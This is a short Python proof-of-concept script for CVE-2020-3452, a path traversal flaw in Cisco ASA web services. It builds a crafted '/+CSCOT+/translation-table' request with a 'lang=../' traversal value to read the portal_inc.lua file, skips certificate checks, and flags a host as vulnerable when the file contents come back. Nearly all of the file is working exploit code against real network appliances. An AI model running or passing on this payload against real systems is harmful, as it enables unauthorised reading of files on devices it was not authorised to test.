#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: carrypan

import requests

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url    
    
    try:
    	header = dict()
    	header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        url = url + '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.get(url, headers=header, timeout=8, allow_redirects=False, verify=False)
        if r.status_code == 200 and "application/octet-stream" in r.headers['Content-Type'] and 'CSCOE' in r.content:
            return '[CISCO ASA cve-2020-3452]\t' + url
        else:    
            return False
    except:
        return False
